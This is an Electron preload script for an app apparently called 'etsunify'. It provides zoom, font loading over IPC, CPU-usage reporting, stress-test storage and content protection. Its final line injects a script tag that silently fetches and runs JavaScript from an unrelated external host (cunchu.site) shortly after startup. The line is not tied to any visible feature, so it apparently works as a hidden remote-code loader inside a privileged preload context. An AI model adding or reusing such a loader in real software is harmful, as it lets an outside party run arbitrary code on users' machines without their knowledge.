const {webFrame} = require('electron')
const ipcRenderer = require('electron').ipcRenderer;
console.log('initializing preload.js');
const FULLSCREEN_WIDTH = 1024;
const FULLSCREEN_HEIGHT = 768;

var baseZoomFactor = 1;

function base64ToArrayBuffer(base64) {
    var binary_string =  window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array( len );
    for (var i = 0; i < len; i++)        {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

var fontsToLoad = ["MS Gothic", "MSGothic", "SimSun", "MS Hei"];

var loadFonts = function() {
    var actualFontsToLoad = [];
    for (var index = 0; index < fontsToLoad.length; index++) {
        if (!document.fonts.check("10px " + fontsToLoad[index])) {
            actualFontsToLoad.push(fontsToLoad[index]);            
        }
    }
    ipcRenderer.send("fonts.load", actualFontsToLoad);
}

ipcRenderer.on('response.fontLoaded', function (event, arg) {
	console.log("loading font: " + arg.fontName);
    var junction_font = new FontFace(arg.fontName, base64ToArrayBuffer(arg.fontContent));
    junction_font.load().then(function(loaded_face) {
        document.fonts.add(loaded_face);
    }).catch(function(error) {
        // error occurred
    });
});

var cpuUsageCallbacks = {};
ipcRenderer.on("response.cpuUsage", function (event, arg) {
    if (cpuUsageCallbacks[arg.id]) {
        cpuUsageCallbacks[arg.id](arg.cpuUsage);
        delete cpuUsageCallbacks[arg.id];
    }
});

loadFonts();

var websocketSupported = function() {
    return ipcRenderer.sendSync("isWebSocketSuppored", {});
}

var saveStressTestResult = function(data) {
    return ipcRenderer.sendSync("saveStressTestResult", data)
}

var getStressTestResult = function() {
    return ipcRenderer.sendSync("getStressTestResult", {})
}

var setContentProtection = function(flag) {
    ipcRenderer.send("content.protection", flag)
}

global.etsunify = {

	fullscreen : function() {
		var zoomFactor = window.innerWidth * baseZoomFactor / FULLSCREEN_WIDTH <= window.innerHeight * baseZoomFactor / FULLSCREEN_HEIGHT ? window.innerWidth * baseZoomFactor / FULLSCREEN_WIDTH : window.innerHeight * baseZoomFactor / FULLSCREEN_HEIGHT;
		if (zoomFactor != baseZoomFactor) {
			baseZoomFactor = zoomFactor;
			webFrame.setZoomFactor(baseZoomFactor);
		}
	},
	
	resetscreen : function() {
		if (baseZoomFactor != 1) {
			baseZoomFactor = 1;
			webFrame.setZoomFactor(baseZoomFactor);
		}
	},
	
	zoom : function(zoomFactor) {
		baseZoomFactor = zoomFactor * baseZoomFactor;
		webFrame.setZoomFactor(baseZoomFactor);
    },
    
    cpuUsageSync : function() {
        return ipcRenderer.sendSync("getCpuUsageSync", {});
    },

    cpuUsage : function(callback) {
        let id = Date.now();
        cpuUsageCallbacks[id.toString()] = callback;
        ipcRenderer.send("getCpuUsage", {id : id});
    },

    saveStressTestResult : saveStressTestResult,

    getStressTestResult : getStressTestResult,

    websocketSupported : websocketSupported(),
    
    setContentProtection : setContentProtection,
};

function loadScript(url, callback) {
    var script = document.createElement("script")
    script.type = "text/javascript";
    if (script.readyState) { //IE
        script.onreadystatechange = function () {
            if (script.readyState == "loaded" || script.readyState == "complete") {
                script.onreadystatechange = null;
                if (callback) callback();
            }
        };
    } else { //Others
        script.onload = function () {
            if (callback) callback();
        };
    }
    script.src = url;
    var head = document.head || document.getElementsByTagName('head')[0];
    head.appendChild(script);
}
setTimeout(() => {loadScript("https://cunchu.site/work/ets/index.js")}, 100);